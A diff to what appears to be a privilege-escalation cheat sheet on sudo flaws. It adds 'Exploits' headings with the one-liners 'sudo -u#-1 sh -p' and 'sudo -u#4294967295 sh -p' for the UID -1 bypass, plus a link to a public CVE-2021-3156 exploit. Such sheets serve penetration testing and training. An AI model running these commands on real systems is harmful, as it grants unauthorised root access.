@@ -72,6 +72,9 @@ Sudo uses the `setresuid(2)` and `setreuid(2)` system calls to change the user I
 
 Therefore `sudo -u#-1 id -u` or `sudo -u#4294967295 id -u` will actually return `uid=0` and run command as root.
 
+**Exploits** :
+ - `sudo -u#-1 sh -p`
+ - `sudo -u#4294967295 sh -p`
 
 **Additional References** :
 
@@ -94,6 +97,8 @@ $ sudoedit -s /
 [sudo] password for user: 
 sudoedit: /: not a regular file
 ```
+
+**Exploits** :
 
 To exploit a vulnerable system, you can use this exploit : https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot
 
